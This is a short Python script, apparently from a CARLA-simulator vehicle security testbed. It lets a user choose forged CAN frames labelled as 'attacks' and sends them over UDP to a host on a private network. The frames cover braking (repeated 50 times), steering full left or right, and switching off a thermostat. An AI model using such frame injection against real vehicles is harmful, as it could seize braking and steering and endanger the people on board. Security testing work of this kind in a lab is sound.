import sys
import os
import can
import cantools
import socket
import time

if "../carla_simulator" not in sys.path:
    sys.path.append("../carla_simulator")

from can_utilities import *

print("import ok")

ip_bb = "192.168.111.214"
port_bb = 6003
address_bb = (ip_bb, port_bb)

sock_bb = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

can_msg = can.Message(arbitration_id=2, data=[128, 0]) # frenata
can_msg_1 = can.Message(arbitration_id=1, data=[0]) #sterzo tutto sx
can_msg_2 = can.Message(arbitration_id=1, data=[70]) #sterzo sx
can_msg_3 = can.Message(arbitration_id=1, data=[255]) #sterzo tutto dx
can_msg_4 = can.Message(arbitration_id=1, data=[180]) #sterzo dx
can_msg_5 = can.Message(arbitration_id=1, data=[128]) #sterzo centrale
can_msg_6 = can.Message(arbitration_id=5, data=[1]) #spengimento termostato

cont = 1
x_old = 1
msg = can_msg_1
while True:
    print("attacco numero:{}".format(cont))
    x = input("inserisci attacco[0-6]:")

    #se non si inserisce nulla viene inviato l'attacco precedente
    if x == "":
        x = x_old
    else:
        x_old = x

    if x == "0":
        msg = can_msg
    elif x == "1":
        msg = can_msg_1
    elif x == "2":
        msg = can_msg_2
    elif x == "3":
        msg = can_msg_3
    elif x == "4":
        msg = can_msg_4
    elif x == "5":
        msg = can_msg_5
    elif x == "6":
        msg = can_msg_6
    print("attacco selezionato:{}".format(x))
    print("----------------------")
    # time.sleep(10)
    cont += 1

    if msg == can_msg:
        for j in range(50):
            sock_bb.sendto(msg_to_string(msg).encode(), address_bb)
            time.sleep(0.01)

    else:
        sock_bb.sendto(msg_to_string(msg).encode(), address_bb)
